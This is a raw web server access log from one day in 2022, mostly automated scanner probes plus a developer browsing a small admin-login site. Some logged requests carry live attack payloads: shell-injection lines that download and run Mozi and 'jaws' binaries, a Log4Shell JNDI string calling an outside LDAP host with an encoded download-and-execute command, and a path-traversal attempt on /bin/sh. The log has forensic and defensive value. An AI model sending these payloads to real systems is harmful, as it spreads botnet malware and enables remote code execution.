167.60.63.247 - - [05/Apr/2022:05:04:13 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
128.1.248.26 - - [05/Apr/2022:05:12:01 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.223.231 - - [05/Apr/2022:05:25:27 +0000] "MGLNDD_34.102.11.81_80\n" 400 0 "-" "-"
103.41.24.83 - - [05/Apr/2022:05:37:40 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 391 "-" "-"
45.155.204.146 - - [05/Apr/2022:05:41:51 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.248.165.52 - - [05/Apr/2022:05:51:59 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [05/Apr/2022:05:52:19 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [05/Apr/2022:05:52:19 +0000] "CONNECT 85.206.160.115:80 HTTP/1.1" 404 372 "-" "-"
185.254.196.223 - - [05/Apr/2022:06:18:26 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:06:18:27 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.99.142.60 - - [05/Apr/2022:06:24:06 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) Project-Resonance (http://project-resonance.com/) (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:06:29:17 +0000] "GET / HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:06:55:59 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.194 - - [05/Apr/2022:08:04:09 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.140.248.32 - - [05/Apr/2022:09:14:12 +0000] "GET / HTTP/1.1" 404 428 "-" "python-requests/2.27.1"
103.178.236.40 - - [05/Apr/2022:09:15:28 +0000] "GET http://example.com/ HTTP/1.1" 404 372 "-" "Go-http-client/1.1"
185.254.196.223 - - [05/Apr/2022:09:19:23 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:09:19:24 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
117.207.225.141 - - [05/Apr/2022:09:52:21 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 391 "-" "-"
197.57.77.108 - - [05/Apr/2022:10:15:58 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ jswl.jdaili.xyz/jaws;sh+/tmp/jaws" 400 0 "-" "-"
117.50.110.5 - - [05/Apr/2022:11:15:28 +0000] "GET / HTTP/1.0" 404 391 "-" "-"
118.91.189.36 - - [05/Apr/2022:11:57:12 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
94.232.41.210 - - [05/Apr/2022:12:04:31 +0000] "\x03" 400 0 "-" "-"
94.102.61.10 - - [05/Apr/2022:12:14:10 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
192.241.226.73 - - [05/Apr/2022:12:14:46 +0000] "GET /portal/redlion HTTP/1.1" 404 372 "-" "Mozilla/5.0 zgrab/0.x"
185.254.196.223 - - [05/Apr/2022:12:19:29 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:12:19:29 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.213.37 - - [05/Apr/2022:12:21:46 +0000] "GET /actuator/health HTTP/1.1" 404 372 "-" "Mozilla/5.0 zgrab/0.x"
157.230.216.203 - - [05/Apr/2022:12:40:56 +0000] "GET /ab2g HTTP/1.1" 400 0 "-" "-"
157.230.216.203 - - [05/Apr/2022:12:40:56 +0000] "GET /ab2h HTTP/1.1" 400 0 "-" "-"
103.178.236.40 - - [05/Apr/2022:12:42:29 +0000] "GET http://example.com/ HTTP/1.1" 404 372 "-" "Go-http-client/1.1"
192.241.225.237 - - [05/Apr/2022:12:47:43 +0000] "GET /hudson HTTP/1.1" 404 372 "-" "Mozilla/5.0 zgrab/0.x"
185.180.143.72 - - [05/Apr/2022:12:49:28 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.129.64.147 - - [05/Apr/2022:13:00:51 +0000] "GET / HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
184.105.247.254 - - [05/Apr/2022:13:19:49 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
144.22.198.141 - - [05/Apr/2022:13:37:38 +0000] "GET / HTTP/1.1" 404 391 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')"
34.132.223.61 - - [05/Apr/2022:14:01:44 +0000] "\x16\x03\x01" 400 0 "-" "-"
34.132.223.61 - - [05/Apr/2022:14:01:49 +0000] "OPTIONS / HTTP/1.0" 404 391 "-" "-"
209.216.92.211 - - [05/Apr/2022:14:18:32 +0000] "-" 408 0 "-" "-"
185.254.196.223 - - [05/Apr/2022:15:19:52 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:15:20:14 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
112.167.113.231 - - [05/Apr/2022:15:50:27 +0000] "POST /editBlackAndWhiteList HTTP/1.1" 404 391 "-" "0xAbyssalDoesntExist"
134.122.3.160 - - [05/Apr/2022:16:47:24 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.122.3.160 - - [05/Apr/2022:16:47:25 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.85.149.194 - - [05/Apr/2022:16:59:48 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 428 "-" "Hello, world"
35.203.125.217 - - [05/Apr/2022:17:04:13 +0000] "\x16\x03\x01" 400 0 "-" "-"
35.203.125.217 - - [05/Apr/2022:17:04:17 +0000] "GET /?q=%hebrew% HTTP/1.0" 404 391 "-" "-"
62.197.136.234 - - [05/Apr/2022:17:07:07 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
159.89.24.92 - - [05/Apr/2022:17:25:38 +0000] "GET / HTTP/1.0" 404 391 "-" "-"
185.20.226.243 - - [05/Apr/2022:17:33:27 +0000] "GET / HTTP/1.0" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
20.37.10.220 - - [05/Apr/2022:17:47:12 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.37.10.220 - - [05/Apr/2022:17:47:13 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
134.209.204.196 - - [05/Apr/2022:17:53:08 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.209.204.196 - - [05/Apr/2022:17:53:11 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:18:19:11 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:18:19:13 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.1.248.26 - - [05/Apr/2022:18:29:07 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
164.90.135.111 - - [05/Apr/2022:18:33:05 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
164.90.135.111 - - [05/Apr/2022:18:33:05 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.17.96.146 - - [05/Apr/2022:18:34:49 +0000] "GET / HTTP/1.0" 404 391 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
20.236.0.98 - - [05/Apr/2022:19:23:42 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
94.232.41.210 - - [05/Apr/2022:19:24:20 +0000] "\x03" 400 0 "-" "-"
209.17.97.90 - - [05/Apr/2022:19:50:32 +0000] "\x16\x03\x01" 400 0 "-" "-"
109.237.103.9 - - [05/Apr/2022:20:06:45 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.17.96.218 - - [05/Apr/2022:20:07:44 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
45.95.169.50 - - [05/Apr/2022:20:40:00 +0000] "GET / HTTP/1.1" 404 391 "-" "Linux Gnu (cow)"
156.96.47.29 - - [05/Apr/2022:21:00:03 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
156.96.47.29 - - [05/Apr/2022:21:00:04 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
185.254.196.223 - - [05/Apr/2022:21:19:25 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:21:19:27 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
74.88.251.87 - - [05/Apr/2022:21:32:42 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
134.209.204.196 - - [05/Apr/2022:22:18:27 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.209.204.196 - - [05/Apr/2022:22:18:29 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
98.248.133.252 - - [05/Apr/2022:22:30:55 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:31:03 +0000] "GET /filter HTTP/1.1" 200 1243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:31:03 +0000] "GET /static/styles/filter.css HTTP/1.1" 200 718 "http://34.102.11.81/filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:31:03 +0000] "GET /filter HTTP/1.1" 200 1242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:31:53 +0000] "GET /homepage HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:32:45 +0000] "-" 408 0 "-" "-"
36.37.140.107 - - [05/Apr/2022:22:34:21 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
36.37.140.107 - - [05/Apr/2022:22:34:22 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
98.248.133.252 - - [05/Apr/2022:22:44:20 +0000] "GET / HTTP/1.1" 500 461 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:45:12 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:46:09 +0000] "GET / HTTP/1.1" 500 461 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:47:01 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:47:42 +0000] "GET / HTTP/1.1" 200 1963 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:47:42 +0000] "GET /static/styles/homepage.css HTTP/1.1" 200 669 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:47:55 +0000] "GET /templates/studentLogin.html HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:47:58 +0000] "GET /templates/adminLogin.html HTTP/1.1" 404 427 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:47:59 +0000] "GET /templates/companyLogin.html HTTP/1.1" 404 427 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:48:08 +0000] "GET /templates/adminLogin.html HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:48:09 +0000] "GET /templates/companyLogin.html HTTP/1.1" 404 427 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:48:44 +0000] "GET /templates/adminLogin.html HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:49:35 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:49:41 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:54:37 +0000] "GET / HTTP/1.1" 200 1963 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:54:43 +0000] "GET /templates/adminLogin.html HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:55:34 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:55:40 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:55:50 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:55:52 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:55:52 +0000] "GET /static/styles/student.css HTTP/1.1" 404 396 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:55:52 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:56:22 +0000] "GET /static/styles/student.css HTTP/1.1" 404 397 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:57:14 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:57:21 +0000] "GET /admin-login HTTP/1.1" 200 1508 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:57:21 +0000] "GET /static/styles/student.css HTTP/1.1" 404 396 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:57:21 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 427 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:57:28 +0000] "GET /static/styles/student.css HTTP/1.1" 404 397 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:58:19 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [05/Apr/2022:22:59:09 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:10 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:10 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:10 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:37 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:39 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:39 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:39 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:41 +0000] "GET / HTTP/1.1" 200 2120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:42 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:42 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 427 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:46 +0000] "GET / HTTP/1.1" 200 2120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:47 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:47 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:47 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:55 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
